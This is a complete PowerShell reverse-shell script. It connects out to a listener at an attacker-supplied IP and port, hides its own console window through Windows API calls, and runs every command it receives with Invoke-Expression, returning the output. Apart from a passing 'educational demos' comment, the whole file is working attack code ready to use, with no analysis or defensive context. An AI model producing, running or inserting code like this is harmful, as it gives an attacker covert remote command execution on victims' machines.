# Define the attacker's IP address and port (replace with your listener details)
$ip = "192.168.1.100"  # Replace with the attacker's IP address
$port = 4444           # Replace with the desired port

# Create a TCP client to connect to the attacker
$client = New-Object System.Net.Sockets.TcpClient($ip, $port)

# Get the stream for sending/receiving data
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$buffer = New-Object System.Byte[] 1024
$encoding = New-Object System.Text.AsciiEncoding

# Hide the PowerShell window (optional, for stealth in educational demos)
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Window {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
$consolePtr = [Window]::GetConsoleWindow()
[Window]::ShowWindow($consolePtr, 0)  # 0 = Hide

# Main loop for the reverse shell
while ($true) {
    # Read data from the attacker
    if ($stream.DataAvailable) {
        $read = $stream.Read($buffer, 0, $buffer.Length)
        $cmd = $encoding.GetString($buffer, 0, $read)
        
        # Execute the command and capture output
        $output = try {
            Invoke-Expression $cmd 2>&1 | Out-String
        } catch {
            "Error: $_" | Out-String
        }
        
        # Send the output back to the attacker
        $writer.WriteLine($output)
    }

    # Check for new input (optional, can be enhanced)
    Start-Sleep -Milliseconds 100
}

# Cleanup (this won't run due to the infinite loop, but included for completeness)
$writer.Close()
$stream.Close()
$client.Close()
